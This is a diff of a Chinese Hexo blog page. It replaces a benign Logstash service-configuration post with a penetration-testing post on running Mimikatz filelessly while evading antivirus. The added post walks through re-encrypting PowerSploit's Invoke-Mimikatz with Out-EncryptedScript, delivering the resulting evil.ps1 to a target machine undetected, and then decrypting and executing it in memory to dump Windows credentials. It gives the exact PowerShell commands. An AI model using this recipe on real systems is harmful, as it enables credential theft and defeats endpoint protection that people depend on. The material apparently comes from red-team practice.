@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Logstash配置以服务方式运行 | Charles&#39; Big Plan</title>
-  <meta name="keywords" content>
-  <meta name="description" content="Logstash配置以服务方式运行 | Charles&#39; Big Plan">
+  <title>简单几步搞定Mimikatz无文件+免杀 | Charles&#39; Big Plan</title>
+  <meta name="keywords" content=" mimikatz ">
+  <meta name="description" content="简单几步搞定Mimikatz无文件+免杀 | Charles&#39; Big Plan">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="HelloIt’s really nice to post my first post in my own blog.  IntroductionMy name is Charles, and for now, I work in Huawei company. My work is mainly about Cyber Security, we use varity of Tools, like">
 <meta property="og:type" content="website">
@@ -497,9 +497,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Logstash配置以服务方式运行" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-简单几步搞定Mimikatz无文件-免杀" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Logstash配置以服务方式运行</h1>
+        <h1 class="article-title">简单几步搞定Mimikatz无文件+免杀</h1>
     
     <div class="article-meta">
         
@@ -507,20 +507,26 @@
         
         <span class="book">
             
-                <a  data-rel="数据与智能">数据与智能</a>
+                <a  data-rel="渗透测试">渗透测试</a>
             
         </span>
         
         
+        <span class="tag">
+            
+            <a class="color4">mimikatz</a>
+            
+        </span>
+        
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-12-21 14:04:23'>2019-12-21 14:02</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-21 14:44:15'>2019-12-21 14:43</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:440</span>
+        <span>字数:790</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -550,7 +556,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0X01-环境准备"><span class="toc-text">0X01 环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-配置"><span class="toc-text">0x02 配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-创建服务"><span class="toc-text">0x03 创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-启动服务"><span class="toc-text">0x04 启动服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-查看日志"><span class="toc-text">0x05 查看日志</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mimikatz"><span class="toc-text">Mimikatz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#工具"><span class="toc-text">工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#免杀"><span class="toc-text">免杀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#步骤"><span class="toc-text">步骤</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -566,62 +572,33 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>logstash最常见的运行方式即命令行运行<code>./bin/logstash -f logstash.conf</code>然后通过ctrl+c结束，这种方式的优点在于运行方便，但是缺点也很明显，不便于管理，同时如果遇到服务器重启，则维护成本会更高一些，如果在生产环境运行logstash建议还是使用服务的方式运行。本文介绍如何将logstash加入linux的service中，以服务的方式启动logstash，同时借助service的特性实现开机自启动的能力。</p>
-<h1 id="0X01-环境准备"><a href="#0X01-环境准备" class="headerlink" title="0X01 环境准备"></a>0X01 环境准备</h1><ul>
-<li>logstash 5.x 以上版本，假设安装在/opt/logstash目录</li>
-<li>Centos服务器</li>
+        <h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><p>Mimikatz可以从Windows内存中dump出登录用户的密码hash(或明文密码)，在安全界可以说家喻户晓，在2016年前后也是大杀四方，现在虽然微软已经发布了相关补丁但是对于大量存量版本Windows系统来讲依然是杀伤力巨大。<br>当前业界大多数防病毒产品对于原生和大部分变种的mimikatz已经有比较高的查杀率，因此在渗透过程中如何投递如何免杀是个大问题，业界已经有很多mimikatz免杀的技术，本文介绍一种基于Powershell Invoke-Mimikatz进行二次加密，实现无文件执行+免杀的方法</p>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a></li>
 </ul>
-<h1 id="0x02-配置"><a href="#0x02-配置" class="headerlink" title="0x02 配置"></a>0x02 配置</h1><p>在安装目录下修改<code>startip.optins</code>文件</p>
-<pre><code>vi /opt/logstash/config/startup.options
-</code></pre><pre><code># Set a home directory
-LS_HOME=/opt/logstash
-
-# logstash settings directory, the path which contains logstash.yml
-LS_SETTINGS_DIR=/opt/logstash/config
-
-# Arguments to pass to logstash
-LS_OPTS=&quot;--path.settings ${LS_SETTINGS_DIR} -f /root/mylogstash&quot;
-# 我们把logstash的配置文件如logstash.conf都放在/root/mylogstash目录下面 
-
-# user and group id to be invoked as
-LS_USER=root
-LS_GROUP=root
-</code></pre><p>之后我们编辑logstash.conf 配置文件，下面的例子将heartbeat写到磁盘上</p>
-<pre><code>input{
-    heartbeat{
-        interval =&gt; 60
-        type =&gt; &quot;heartbeat&quot;
-        message =&gt; &quot;logstash is alive&quot;
-    }
-
-    syslog{
-        host =&gt; &quot;0.0.0.0&quot;
-        port =&gt; 1514
-    }
-}
-
-output{
-    file {
-        path =&gt; &quot;/root/logs/%{+yyyyMMdd}.log&quot;
-        codec =&gt; line { format =&gt; &quot;%{message}&quot;}
-    }
-}
-</code></pre><h2 id="0x03-创建服务"><a href="#0x03-创建服务" class="headerlink" title="0x03 创建服务"></a>0x03 创建服务</h2><p>以root身份执行logstash命令创建服务</p>
-<pre><code>/opt/logstash/bin/system-install
-</code></pre><p>完成后在会在这里创建一个配置文件<code>/etc/systemd/system/logstash.service</code></p>
-<h2 id="0x04-启动服务"><a href="#0x04-启动服务" class="headerlink" title="0x04 启动服务"></a>0x04 启动服务</h2><p>启动Logstash服务</p>
-<ul>
-<li>设置服务自启动：systemctl enable logstash</li>
-<li>启动服务：systemctl start logstash</li>
-<li>停止服务：systemctl stop logstash</li>
-<li>重启服务：systemctl restart logstash</li>
-<li>查看服务状态：systemctl status logstash</li>
-</ul>
-<h2 id="0x05-查看日志"><a href="#0x05-查看日志" class="headerlink" title="0x05 查看日志"></a>0x05 查看日志</h2><p>默认情况下日志会保存在以下两个位置</p>
-<ul>
-<li>/var/log/messages</li>
-<li>/opt/logstash/logs</li>
-</ul>
+<p>PowerSploit工程提供了多种黑客工具的加密版本和加密方法，基本都是基于Powershell的，其中也包括了<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">Invoke-Mimikatz</a>，他已经对mimikatz进行了一次加密，并且将通过powershell封装可以让其直接在内存中运行而本地无明文的mimikatz。</p>
+<p><strong>但是</strong>即便这样大部分杀毒软件也已经可以识别Invoke-Mimikatz脚本并进行查杀了。。</p>
+<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>在最近一次渗透测试中，蓝军的做法给了新的思路，如果对Invoke-Mimikatz再做一次加密，并将解密的内容全加载到内存，似乎又可以做到无文件和免杀了。</p>
+<p>这里我们用到PowerSploit里面的<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/ScriptModification" target="_blank" rel="noopener">Out-EncryptedScript.ps1</a>实现，这个神奇可以加密所有文本文件或者脚本，并将解密结果写到内存，磁盘上不留半点痕迹。</p>
+<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>要制作一个二次加密的Invoke-Mimikatz需要先下载<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a>工程到本地</p>
+<blockquote>
+<p>大部分杀毒软件会把这个工程里面的关键文件识别为病毒并且直接干掉，所以建议在试验环境或者虚拟机中执行</p>
+<pre><code>git clone https://github.com/PowerShellMafia/PowerSploit
+</code></pre><p>将Out-EncryptedScript.ps1与Invoke-Mimikatz.ps1放在一起，启动Powershell执行加密过程</p>
+<pre><code>C:\PS&gt; Out-EncryptedScript .\Invoke-Mimikatz.ps1 password salty
+</code></pre><p><code>password</code>是加密脚本的秘钥，<code>salty</code>是随机数，防止密码破解。这两个东西要记好，在解密的时候会用到。执行成功以后会生成一个叫<code>evil.ps1</code>的文件在当前目录，这个就是加密后的结果，也就是免杀的最终文件，把这个文件投递到目标机器完全不会触发任何告警，因为脚本本身就是一串加密但是看起来无害的字符。</p>
+</blockquote>
+<p><strong>执行加密脚本</strong><br>在目标机上执行以下powershell命令</p>
+<pre><code>C:\PS&gt; [String] $cmd = Get-Content .\evil.ps1
+C:\PS&gt; Invoke-Expression $cmd
+C:\PS&gt; $decrypted = de password salt
+C:\PS&gt; Invoke-Expression $decrypted
+C:\PS&gt; Invoke-Mimikatz
+</code></pre><p><img src="https://i.postimg.cc/t4R7CgmT/8818451-9d2e137d6c16630d.png" alt="mimikatz"><br>还是那熟悉的配方，真香！</p>
+<blockquote>
+<p>最后提一点，上述开源项目最近3年似乎都没有更新过，但是powershell的版本一已经从v2到了v5，所以基本上Invoke-Mimikatz对win7和windows2008 R2还有用，但是对之后的版本基本上就不好使了。</p>
+</blockquote>
+<p>有关mimikatz对防病毒的免杀还有一篇神奇的文章可以参考一下：<a href="https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 370716264@qq.com </span>
@@ -631,12 +608,12 @@ output{
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Logstash配置以服务方式运行</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">440</span></p>
+    <p><span class="copy-title">文章标题:</span>简单几步搞定Mimikatz无文件+免杀</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">790</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Charles Liu">Charles Liu</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-21, 14:02:00</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-21, 14:04:23</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/21/Logstash配置以服务方式运行/" title="Logstash配置以服务方式运行">http://www.dearcharles.cn/2019/12/21/Logstash配置以服务方式运行/</a>
+    <p><span class="copy-title">发布时间:</span>2019-12-21, 14:43:00</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-21, 14:44:15</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/21/简单几步搞定Mimikatz无文件-免杀/" title="简单几步搞定Mimikatz无文件+免杀">http://www.dearcharles.cn/2019/12/21/简单几步搞定Mimikatz无文件-免杀/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
